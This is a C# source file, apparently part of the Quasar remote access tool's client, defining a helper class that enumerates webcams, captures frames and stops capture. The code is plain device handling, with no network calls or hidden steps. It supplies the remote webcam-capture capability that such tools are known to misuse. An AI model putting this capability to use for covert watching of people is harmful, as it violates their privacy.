using System.Collections;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Quasar.Client.Helper
{
    public class WebcamHelper
    {
        private FilterInfoCollection _videoCaptureDevices;

        private VideoCaptureDevice _videoSource;

        public Bitmap _currentFrame;

        public Size _resolution;

        private bool _isStarted;

        public void Init(int screenNumber)
        {
            if (!_isStarted)
            {
                _videoSource = new VideoCaptureDevice(_videoCaptureDevices[screenNumber].MonikerString);
                _resolution = _videoSource.VideoCapabilities[0].FrameSize;
                _videoSource.NewFrame += new NewFrameEventHandler(FinalVideoSource_NewFrame);
                _videoSource.Start();
                _isStarted = true;
            }
        }

        private void FinalVideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            _currentFrame = (Bitmap)eventArgs.Frame.Clone();
        }

        public void StopRunningVideo()
        {
            if (_videoSource != null && _videoSource.IsRunning) _videoSource.SignalToStop();
            _isStarted = false;
        }

        public void NewVideoSource(int screenNumber)
        {
            if (_videoSource != null && _videoSource.IsRunning) _videoSource.SignalToStop();
            _videoSource = new VideoCaptureDevice(_videoCaptureDevices[screenNumber].MonikerString);
            _resolution = _videoSource.VideoCapabilities[0].FrameSize;
            _videoSource.NewFrame += new NewFrameEventHandler(FinalVideoSource_NewFrame);
            _videoSource.Start();
        }

        public ArrayList GetDevices()
        {
            ArrayList _webcamDevices = new ArrayList();
            _videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo VideoCaptureDevice in _videoCaptureDevices)
            {
                _webcamDevices.Add(VideoCaptureDevice.Name);
            }
            return _webcamDevices;
        }
    }
}
